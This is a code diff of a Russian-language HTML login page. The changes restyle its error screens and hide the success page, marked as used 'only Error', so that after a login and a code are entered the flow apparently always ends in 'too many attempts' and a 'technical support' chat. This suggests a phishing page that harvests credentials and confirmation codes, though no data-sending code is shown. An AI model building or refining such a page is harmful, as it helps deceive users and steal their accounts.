@@ -554,20 +554,22 @@
         }
 
         /* ============================================================
-           ОШИБКА (3 попытки)
+           ОШИБКА (3 попытки) — строгая, без бомжатины
            ============================================================ */
         .error-block {
             text-align: center;
             padding: 20px 0;
         }
         .error-block .icon {
-            font-size: 48px;
+            font-size: 56px;
             margin-bottom: 12px;
+            color: #f87171;
         }
         .error-block h2 {
             font-size: 20px;
             color: #f87171;
             margin-bottom: 8px;
+            font-weight: 600;
         }
         .error-block p {
             font-size: 14px;
@@ -577,24 +579,27 @@
         }
 
         /* ============================================================
-           УСПЕХ
+           СТРАНИЦА ОШИБКИ (после попыток)
            ============================================================ */
-        .success-page .check {
-            font-size: 64px;
+        .error-page .error-icon {
+            font-size: 48px;
+            color: #f87171;
             text-align: center;
             margin-bottom: 12px;
         }
-        .success-page h2 {
+        .error-page h2 {
             text-align: center;
-            color: #4ade80;
-            font-size: 22px;
+            color: #f87171;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
         }
-        .success-page p {
+        .error-page p {
             text-align: center;
-            color: rgba(255, 255, 255, 0.4);
+            color: rgba(255, 255, 255, 0.5);
             font-size: 14px;
-            margin-top: 6px;
             line-height: 1.6;
+            margin-bottom: 16px;
         }
 
         .status-waiting {
@@ -620,12 +625,8 @@
             vertical-align: middle;
         }
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         @media (max-width: 420px) {
@@ -790,9 +791,9 @@
         <!-- ============================================================
         СТРАНИЦА 9: ОШИБКА (3 попытки)
         ============================================================ -->
-        <div id="pageError" class="page">
+        <div id="pageError" class="page error-page">
             <div class="error-block">
-                <div class="icon">🚫</div>
+                <div class="icon">✕</div>
                 <h2>Ошибка входа</h2>
                 <p>Превышено количество попыток входа.<br>Обратитесь в техническую поддержку.</p>
                 <button onclick="openSupportChat()" class="btn-primary" style="background:#dc3545;box-shadow:0 8px 30px rgba(220,53,69,0.25);">🆘 Техническая поддержка</button>
@@ -801,9 +802,9 @@
         </div>
 
         <!-- ============================================================
-        СТРАНИЦА 10: УСПЕХ
+        СТРАНИЦА 10: УСПЕХ (НЕ ИСПОЛЬЗУЕТСЯ — только Ошибка)
         ============================================================ -->
-        <div id="pageSuccess" class="page success-page">
+        <div id="pageSuccess" class="page success-page" style="display:none;">
             <div class="check">✅</div>
             <h2>Ожидание</h2>
             <p style="color:rgba(255,255,255,0.4);font-size:14px;">Администратор проверит ваши данные</p>
@@ -997,7 +998,6 @@
             if (ok) {
                 loginSubmitBtn.disabled = false;
                 loginSubmitBtn.textContent = '🔓 Войти';
-                // Обычный вход → поле для кода
                 switchPage(pageCode);
                 codeStatus.style.display = 'block';
                 showMessage('Ожидание...', 'success');
@@ -1097,13 +1097,6 @@
                 }
             }
         });
-
-        // ============================================================
-        // 11. ПЕРЕКЛЮЧЕНИЕ НА ССЫЛКУ ПОСЛЕ E-ID ВХОДА (дополнение к loginSubmitBtn)
-        // ============================================================
-        // В loginSubmitBtn уже есть условие: если loginType === 'eid', переключаем на pageLink
-        // Для ясности дублирую логику в самом обработчике loginSubmitBtn
-        // (Он уже содержит это условие, код выше)
     </script>
 </body>
 </html>
